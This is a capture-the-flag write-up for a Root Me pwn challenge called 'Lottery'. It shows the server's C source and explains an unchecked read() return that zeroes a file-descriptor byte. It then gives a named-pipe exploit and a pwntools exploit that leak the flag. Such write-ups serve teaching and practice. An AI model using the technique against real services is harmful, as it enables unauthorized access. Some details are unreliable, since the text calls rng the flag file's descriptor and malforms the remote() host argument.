# CTF20K (Root Me) - Lottery
 
**Points:** 500 \
**Category:** Pwn

---

## TL;DR

[This challenge let's the user enter a ticket and win or not a lottery (the flag).]

---

## Provided files:
- **lottery.c** : source code of the server.
- **Makefile** : to compile and test locally

## Code analysis

Let's examine the lottery.c :

```
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define RNG_FILENAME "/dev/urandom"
#define PRIZE_FILENAME "flag.txt"
#define DEFAULT_TICKET "ROOT-ME-DEFAULT-LOTTERY-TICKET"

typedef struct {
    unsigned short age;
    char terms_agreed;
    char rng;
    char ticket[32];
} lottery_data_t;

/* Initialize lottery */
lottery_data_t lottery_data = {
    .age = 0,
    .terms_agreed = 0,
    .ticket = DEFAULT_TICKET
};

/* Open secure RNG source */
void loadRng() {
    int fd;
    fd = open(RNG_FILENAME, O_RDONLY);
    if (fd < 0) {
        perror("Error opening " RNG_FILENAME);
        exit(EXIT_FAILURE);
    }
    lottery_data.rng = (char) fd;
}

/* Verify user age for legal purposes */
void verifyAge() {
    printf("Please confirm your age: ");
    scanf("%hu%*c", &(lottery_data.age));
    if (lottery_data.age < 18) {
        printf("Sorry, you are not old enough to participate...\n");
        exit(EXIT_FAILURE);
    }
}

/* Read user lottery ticket */
void readTicket() {
    ssize_t n;
    printf("Please enter your lottery ticket: ");
    n = read(0, lottery_data.ticket, 32);
    lottery_data.ticket[n-1] = 0;
}

/* Register a user for the lottery */
void registerForLottery() {
    char confirm[64];
    char* ptr;
    printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
    printf("~~~ Welcome to the annual Root Me lottery! ~~~\n");
    printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n");

    printf("To participate, please agree to the terms of service by typing 'I agree': ");
    fgets(confirm, sizeof(confirm), stdin);
    ptr = strchr(confirm, '\n');
    if (ptr) {
        *ptr = 0;
    }
    lottery_data.terms_agreed = (strcmp(confirm, "I agree") == 0);
    if (!lottery_data.terms_agreed) {
        printf("You did not agree to the terms of service. Goodbye!\n");
        exit(EXIT_FAILURE);
    }

    verifyAge();
    readTicket();
}

/* Return 0 if user has a winning ticket */
int rollLottery() {
    char roll[30];
    printf("Checking your ticket...\n");
    sleep(2);
    read(lottery_data.rng, roll, 30);
    return memcmp(roll, lottery_data.ticket, 30);
}

/* Give the first prize to the winner */
void firstPrize() {
    FILE* prize_file;
    char* prize;
    size_t len = 0;
    printf("CONGRATULATIONS!! YOU WON THE FIRST PRIZE!!!\n");
    if ((prize_file = fopen(PRIZE_FILENAME, "r")) == NULL) {
        perror("Could not find your prize. This should not happen, please contact an organizer.\n");
        exit(EXIT_FAILURE);
    }
    getline(&prize, &len, prize_file);
    printf("Here is your prize: %s\n", prize);
    fclose(prize_file);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    loadRng();
    registerForLottery();
    if (rollLottery() == 0) {
        firstPrize();
    } else {
        printf("Sorry, you didn't win anything. Better luck next time!\n");
    }
    return EXIT_SUCCESS;
}
```
In a nutshell, the client is asked to give his ticket, and then server checks whether it is equal to the server's ticket; if so, it returns the flag, otherwise, it exits.

## Initial analysis:
First off, the used ticket structure is :
```
typedef struct {
    unsigned short age;
    char terms_agreed;
    char rng; // Stores the fd of flag file
    char ticket[32]; // Stores of user's input ticket
} lottery_data_t;
```
**Note:** in memory, `rng` is contiguous to and comes before `ticket`, meaning that `rng`'s address is lower than `ticket`'s.

Here are the 2 interesting functions:
```
void readTicket() {
    ssize_t n;
    printf("Please enter your lottery ticket: ");
    n = read(0, lottery_data.ticket, 32);
    lottery_data.ticket[n-1] = 0;
}
```
`readTicket()` simply reads the user's ticket into `lottery_data.ticket`.

```
int rollLottery() {
    char roll[30];
    printf("Checking your ticket...\n");
    sleep(2);
    read(lottery_data.rng, roll, 30);
    return memcmp(roll, lottery_data.ticket, 30);
}
```
`rollLottery()` reads the flag from the `fd` of the flag(or at least, that's the intented way), and then compares the user's ticket to the server's using `memcmp`.


## The vulnerability:
In `readTicket()`:
```
void readTicket() {
    ...
    n = read(0, lottery_data.ticket, 32);
    lottery_data.ticket[n-1] = 0; // Unchecked n-1 < 0
}
```
There's a buffer underflow because `n-1` is not checked; hence, if we read 0 characters, `lottery_data.ticket[n-1]` references the previous byte before `&lottery_data.ticket` which is exactly **`rng`**.

### Exploitation plan:
- For the user's ticket, read 0 characters by sending an EOF with a certain technic.
- This will make `lottery_data.rng` equal to 0.
- `rollLottery()` then queries the user to enter a ticket: give the default ticket since `lottery_data.ticket` is never changed.
- `memcmp` compares the default ticket with the user's input which is still the default ticket : Get the flag.


## Exploitation
Local exploitation:
```
mkfifo input_pipe

# Run program in background
./lottery < input_pipe &

# Send first input
# dd if=/dev/null of=input_pipe bs=1 count=0    # Signal EOF
dd if=<(echo -n "I agree\n25\n\n") of=input_pipe  # Send first input
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=/dev/null of=input_pipe bs=1 count=0    # Send EOF for second read
dd if=<(echo -n "ROOT-ME-DEFAULT-LOTTERY-TICKET") of=input_pipe
# Clean up
rm input_pipe
```

Remote exploitation:
```
from pwn import *

p = remote("challenges.ctf20k.root-me.org 11001", 11001)

p.recv()

payload = b"I agree\x00" + b"x"*24
payload += b"ROOT-ME-DEFAULT-LOTTERY-TICKET\x00"
p.sendline(payload)

p.recvuntil(b"your age: ")
p.sendline(b"77")

p.recvuntil(b"your lottery ticket: ")
# shutdown <=> EOF
p.shutdown('send')

p.interactive()
```
